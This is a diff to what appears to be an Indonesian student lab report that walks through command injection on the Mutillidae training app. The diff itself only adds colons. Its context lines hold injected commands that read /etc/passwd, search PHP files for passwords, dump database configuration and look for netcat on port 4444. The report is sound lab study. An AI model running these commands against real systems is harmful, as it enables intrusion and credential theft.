@@ -33,22 +33,22 @@
 1. Initial Reconnaissance
 	- Buka url berikut pada browser 
 	http://10.0.1.100/mutillidae/execute_command.php
-	- Ketikkan perintah berikut pada textbox
+	- Ketikkan perintah berikut pada textbox:
 	  ```whoami; pwd```
 	- Klik tombol Execute Command
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/whoami.png "Home page")
 2. Who is Logged On
-   - Ketikkan perintah berikut pada textbox
+   - Ketikkan perintah berikut pada textbox:
 	 ```w```
    - Klik tombol Execute Command
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/w.png "Home page")
 3. Exploring /etc/passwd
-   - Ketikkan perintah berikut pada textbox
+   - Ketikkan perintah berikut pada textbox:
 	 ```cat /etc/passwd```
    - Klik tombol Execute Command
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/cat_passwd.png "Home page")
 4. Network Reconnaissance
-   - Ketikkan perintah berikut pada textbox
+   - Ketikkan perintah berikut pada textbox:
    ```bash
    netstat -nao | grep "0.0.0.0:"
    ```
@@ -57,14 +57,14 @@
 
 ## Using the Backdoor for Database Reconnaissance
 1. Database Reconnaissance
-   - Ketikkan perintah berikut pada textbox
+   - Ketikkan perintah berikut pada textbox:
    ```bash
    find * -name "*.php" | xargs grep -i "password" | grep "="
    ```
    - Klik tombol Execute Command
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/find.png "Home page")
 2. View Database Authentication Attributes
-   - Ketikkan perintah berikut pada textbox
+   - Ketikkan perintah berikut pada textbox:
    ```bash
    cat config.inc | grep -v "<?php"
    ```
@@ -73,7 +73,7 @@
 
 ##  Using the Backdoor for Netcat Reconnaissance
 1. Netcat Reconnaissance
-   - Ketikkan perintah berikut pada textbox
+   - Ketikkan perintah berikut pada textbox:
    ```bash
    which nc; netstat -nao | grep 4444 | wc -l
    ```
